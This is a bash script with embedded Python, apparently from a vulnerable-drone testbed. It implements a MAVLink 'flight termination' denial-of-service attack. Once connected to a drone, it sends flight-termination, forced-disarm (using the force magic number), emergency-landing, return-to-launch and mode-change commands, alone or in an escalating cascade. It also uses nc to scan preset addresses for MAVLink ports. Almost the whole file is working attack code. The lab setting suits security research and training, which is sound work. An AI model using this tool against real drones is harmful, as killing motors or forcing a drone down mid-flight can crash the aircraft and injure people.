#!/bin/bash
# flight_termination_attack.sh - 드론 강제 비행 종료 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/flight_termination_attack.sh
# Purpose: MAVLink 명령을 통한 드론 비행 강제 종료 및 응급 착륙

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Flight Termination Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}        Flight Termination Attack         ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_flight_termination() {
    local target_host=${1:-"127.0.0.1"}
    local target_port=${2:-"5760"}
    local termination_mode=${3:-"immediate"}
    local force_level=${4:-"standard"}
    
    log_info "Starting flight termination attack"
    log_info "Target: ${target_host}:${target_port}"
    log_info "Termination mode: ${termination_mode}"
    log_info "Force level: ${force_level}"
    
    # Python 스크립트 생성 및 실행
    create_and_run_termination_attack "$target_host" "$target_port" "$termination_mode" "$force_level"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Flight termination attack completed successfully"
        return 0
    else
        log_error "Flight termination attack failed"
        return 1
    fi
}

create_and_run_termination_attack() {
    local target_host="$1"
    local target_port="$2"
    local termination_mode="$3"
    local force_level="$4"
    
    log_info "Creating and executing flight termination attack..."
    
    python3 << PYEOF
from pymavlink import mavutil
import sys
import time
import signal

class FlightTerminator:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.master = None
        self.commands_sent = 0
        self.responses_received = 0
        
        # 비행 종료 방법들
        self.termination_methods = {
            "immediate": self.execute_immediate_termination,
            "emergency_land": self.execute_emergency_landing,
            "force_disarm": self.execute_force_disarm,
            "cascade": self.execute_cascade_termination,
            "failsafe_trigger": self.trigger_multiple_failsafes,
            "rtl_override": self.override_return_to_launch
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\\n[!] Attack interrupted. Commands sent: {self.commands_sent}, Responses: {self.responses_received}")
        if self.master:
            self.master.close()
        sys.exit(0)
    
    def connect_to_drone(self):
        """드론에 연결"""
        try:
            connection_string = f'tcp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}...")
            
            self.master = mavutil.mavlink_connection(connection_string)
            
            # 하트비트 대기 (타임아웃 10초)
            print("[*] Waiting for heartbeat...")
            msg = self.master.wait_heartbeat(timeout=10)
            
            if msg:
                print(f"[+] Connected to drone (System ID: {self.master.target_system})")
                print(f"[+] Drone type: {msg.type}, Autopilot: {msg.autopilot}")
                print(f"[+] System status: {msg.system_status}")
                return True
            else:
                print("[-] No heartbeat received")
                return False
                
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def check_system_status(self):
        """시스템 상태 확인"""
        try:
            print("[*] Checking system status...")
            
            # 현재 시스템 상태 요청
            self.master.mav.heartbeat_request_send(
                self.master.target_system,
                self.master.target_component
            )
            
            # 하트비트 응답 대기
            msg = self.master.recv_match(type='HEARTBEAT', timeout=5)
            
            if msg:
                status_names = {
                    0: "UNINIT",
                    1: "BOOT", 
                    2: "CALIBRATING",
                    3: "STANDBY",
                    4: "ACTIVE",
                    5: "CRITICAL",
                    6: "EMERGENCY",
                    7: "POWEROFF",
                    8: "FLIGHT_TERMINATION"
                }
                
                status_name = status_names.get(msg.system_status, f"UNKNOWN({msg.system_status})")
                print(f"[+] Current system status: {status_name}")
                
                if msg.system_status == mavutil.mavlink.MAV_STATE_FLIGHT_TERMINATION:
                    print("[!] Drone is already in flight termination state")
                elif msg.system_status == mavutil.mavlink.MAV_STATE_EMERGENCY:
                    print("[!] Drone is in emergency state")
                elif msg.system_status == mavutil.mavlink.MAV_STATE_CRITICAL:
                    print("[!] Drone is in critical state")
                
                return True
            else:
                print("[-] No status response received")
                return False
                
        except Exception as e:
            print(f"[-] Status check failed: {e}")
            return False
    
    def execute_immediate_termination(self):
        """즉시 비행 종료"""
        print("[*] Executing immediate flight termination...")
        
        try:
            # MAV_CMD_DO_FLIGHTTERMINATION 명령
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION,
                0,  # confirmation
                1,  # param1: 1 = terminate flight
                0, 0, 0, 0, 0, 0  # unused parameters
            )
            
            self.commands_sent += 1
            print("[+] Flight termination command sent")
            
            # 응답 확인
            return self.wait_for_command_ack(mavutil.mavlink.MAV_CMD_DO_FLIGHTTERMINATION)
            
        except Exception as e:
            print(f"[-] Immediate termination failed: {e}")
            return False
    
    def execute_emergency_landing(self):
        """응급 착륙 명령"""
        print("[*] Executing emergency landing...")
        
        try:
            # MAV_CMD_NAV_LAND 명령
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_LAND,
                0,  # confirmation
                0,  # param1: abort altitude
                0,  # param2: precision land mode
                0, 0, 0, 0, 0  # lat, lon, alt (0 = current position)
            )
            
            self.commands_sent += 1
            print("[+] Emergency landing command sent")
            
            return self.wait_for_command_ack(mavutil.mavlink.MAV_CMD_NAV_LAND)
            
        except Exception as e:
            print(f"[-] Emergency landing failed: {e}")
            return False
    
    def execute_force_disarm(self):
        """강제 무장 해제"""
        print("[*] Executing forced disarm...")
        
        try:
            # MAV_CMD_COMPONENT_ARM_DISARM 명령 (강제)
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                0,  # confirmation
                0,  # param1: 0 = disarm
                21196,  # param2: force disarm magic number
                0, 0, 0, 0, 0
            )
            
            self.commands_sent += 1
            print("[+] Force disarm command sent")
            
            return self.wait_for_command_ack(mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM)
            
        except Exception as e:
            print(f"[-] Force disarm failed: {e}")
            return False
    
    def execute_cascade_termination(self):
        """연쇄적 종료 명령"""
        print("[*] Executing cascade termination sequence...")
        
        termination_sequence = [
            ("Flight Termination", self.execute_immediate_termination),
            ("Emergency Landing", self.execute_emergency_landing),
            ("Force Disarm", self.execute_force_disarm)
        ]
        
        success_count = 0
        
        for name, func in termination_sequence:
            print(f"\\n[*] Step: {name}")
            if func():
                success_count += 1
                print(f"[+] {name}: SUCCESS")
            else:
                print(f"[-] {name}: FAILED")
            
            time.sleep(2)  # 명령 간 대기
        
        print(f"\\n[+] Cascade termination completed: {success_count}/{len(termination_sequence)} successful")
        return success_count > 0
    
    def trigger_multiple_failsafes(self):
        """다중 페일세이프 트리거"""
        print("[*] Triggering multiple failsafe conditions...")
        
        try:
            # 배터리 페일세이프 시뮬레이션 (낮은 전압 설정)
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_PREFLIGHT_SET_SENSOR_OFFSETS,
                0,
                0, 0, 0, 0, 0, 0, 0
            )
            
            self.commands_sent += 1
            print("[+] Failsafe trigger commands sent")
            
            # RC 페일세이프 시뮬레이션
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE,
                0,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                18,  # RTL mode
                0, 0, 0, 0, 0
            )
            
            self.commands_sent += 1
            print("[+] Multiple failsafe triggers activated")
            return True
            
        except Exception as e:
            print(f"[-] Failsafe triggering failed: {e}")
            return False
    
    def override_return_to_launch(self):
        """RTL 강제 실행"""
        print("[*] Overriding with Return to Launch...")
        
        try:
            # RTL 모드 강제 설정
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                0,
                0, 0, 0, 0, 0, 0, 0
            )
            
            self.commands_sent += 1
            print("[+] RTL override command sent")
            
            return self.wait_for_command_ack(mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH)
            
        except Exception as e:
            print(f"[-] RTL override failed: {e}")
            return False
    
    def wait_for_command_ack(self, command_id, timeout=10):
        """명령 확인 응답 대기"""
        start_time = time.time()
        
        while (time.time() - start_time) < timeout:
            try:
                msg = self.master.recv_match(type='COMMAND_ACK', timeout=1)
                
                if msg and msg.command == command_id:
                    self.responses_received += 1
                    
                    result_names = {
                        0: "ACCEPTED",
                        1: "TEMPORARILY_REJECTED", 
                        2: "DENIED",
                        3: "UNSUPPORTED",
                        4: "FAILED",
                        5: "IN_PROGRESS"
                    }
                    
                    result_name = result_names.get(msg.result, f"UNKNOWN({msg.result})")
                    
                    if msg.result == mavutil.mavlink.MAV_RESULT_ACCEPTED:
                        print(f"[+] Command acknowledged: {result_name}")
                        return True
                    else:
                        print(f"[-] Command failed: {result_name}")
                        return False
                
            except Exception as e:
                print(f"[-] Error waiting for ACK: {e}")
                break
        
        print("[-] Command acknowledgment timeout")
        return False
    
    def monitor_system_state(self, duration=30):
        """시스템 상태 모니터링"""
        print(f"[*] Monitoring system state for {duration} seconds...")
        
        start_time = time.time()
        last_status = None
        
        while (time.time() - start_time) < duration:
            try:
                msg = self.master.recv_match(type='HEARTBEAT', timeout=2)
                
                if msg and msg.system_status != last_status:
                    status_names = {
                        0: "UNINIT", 1: "BOOT", 2: "CALIBRATING", 3: "STANDBY",
                        4: "ACTIVE", 5: "CRITICAL", 6: "EMERGENCY", 7: "POWEROFF",
                        8: "FLIGHT_TERMINATION"
                    }
                    
                    status_name = status_names.get(msg.system_status, f"UNKNOWN({msg.system_status})")
                    print(f"[*] System status changed: {status_name}")
                    
                    last_status = msg.system_status
                    
                    if msg.system_status == mavutil.mavlink.MAV_STATE_FLIGHT_TERMINATION:
                        print("[+] FLIGHT TERMINATION STATE ACHIEVED!")
                        return True
                    elif msg.system_status == mavutil.mavlink.MAV_STATE_EMERGENCY:
                        print("[!] System entered emergency state")
                    elif msg.system_status == mavutil.mavlink.MAV_STATE_POWEROFF:
                        print("[+] System powered off")
                        return True
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        print("[*] Monitoring completed")
        return False
    
    def execute_termination_attack(self, mode, force_level):
        """메인 종료 공격 실행"""
        print(f"[*] Executing termination attack: {mode} (force: {force_level})")
        
        if not self.connect_to_drone():
            return False
        
        # 시스템 상태 확인
        self.check_system_status()
        
        # 종료 방법 실행
        if mode in self.termination_methods:
            success = self.termination_methods[mode]()
        else:
            print(f"[-] Unknown termination mode: {mode}")
            return False
        
        if success:
            print("\\n[*] Monitoring system response...")
            self.monitor_system_state(15)
        
        # 강제 레벨에 따른 추가 공격
        if force_level == "aggressive" and not success:
            print("\\n[*] Primary termination failed, trying aggressive methods...")
            self.execute_cascade_termination()
        
        print(f"\\n[+] Attack completed. Commands sent: {self.commands_sent}, Responses: {self.responses_received}")
        
        if self.master:
            self.master.close()
        
        return success

# 메인 실행 로직
target_ip = "$target_host"
target_port = int("$target_port")
termination_mode = "$termination_mode"
force_level = "$force_level"

terminator = FlightTerminator(target_ip, target_port)

try:
    print(f"[*] Starting flight termination attack on {target_ip}:{target_port}")
    print(f"[*] Mode: {termination_mode}, Force: {force_level}")
    print(f"[*] Press Ctrl+C to stop attack")
    print("")
    
    success = terminator.execute_termination_attack(termination_mode, force_level)
    
    if success:
        print(f"\\n[+] Flight termination attack completed successfully")
        sys.exit(0)
    else:
        print(f"\\n[-] Flight termination attack failed")
        sys.exit(1)
        
except Exception as e:
    print(f"[-] Attack execution failed: {e}")
    sys.exit(1)
PYEOF
    
    return $?
}

# MAVLink 타겟 스캔
scan_mavlink_targets() {
    log_info "Scanning for MAVLink targets..."
    
    local common_targets=(
        "127.0.0.1:5760"
        "127.0.0.1:14550"
        "10.13.0.3:5760"
        "10.13.0.4:14550"
        "192.168.13.1:5760"
        "192.168.1.100:5760"
    )
    
    local found_targets=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
            found_targets+=("$target")
            echo -e "${GREEN}Found MAVLink service: $target${NC}"
        fi
    done
    
    if [ ${#found_targets[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live MAVLink targets found, using simulation mode${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Python 의존성 확인
    if ! python3 -c "import pymavlink" 2>/dev/null; then
        log_info "Installing Python dependencies..."
        pip3 install pymavlink >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local target_host="${1:-127.0.0.1}"
    local target_port="${2:-5760}"
    local termination_mode="${3:-immediate}"
    local force_level="${4:-standard}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_host] [target_port] [termination_mode] [force_level]"
        echo "  target_host      : Target IP address (default: 127.0.0.1)"
        echo "  target_port      : Target MAVLink port (default: 5760)"
        echo "  termination_mode : Termination method (default: immediate)"
        echo "  force_level      : Attack intensity (default: standard)"
        echo ""
        echo "Termination modes:"
        echo "  immediate        : Direct flight termination command"
        echo "  emergency_land   : Emergency landing procedure"
        echo "  force_disarm     : Forced motor disarmament"
        echo "  cascade          : Sequential termination methods"
        echo "  failsafe_trigger : Multiple failsafe activation"
        echo "  rtl_override     : Return-to-launch override"
        echo ""
        echo "Force levels:"
        echo "  standard         : Single termination attempt"
        echo "  aggressive       : Multiple termination methods if primary fails"
        echo ""
        echo "Examples:"
        echo "  $0                                       # Immediate termination"
        echo "  $0 10.13.0.3 5760 emergency_land       # Emergency landing"
        echo "  $0 127.0.0.1 5760 cascade aggressive   # Cascade with aggressive mode"
        echo "  $0 127.0.0.1 5760 force_disarm         # Force disarm motors"
        echo ""
        echo "Target examples:"
        echo "  10.13.0.3:5760   - Companion Computer"
        echo "  127.0.0.1:5760   - Local SITL"
        echo "  127.0.0.1:14550  - QGroundControl"
        exit 0
    fi
    
    # 타겟 스캔 (정보용)
    scan_mavlink_targets
    
    # 공격 실행
    execute_flight_termination "$target_host" "$target_port" "$termination_mode" "$force_level"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi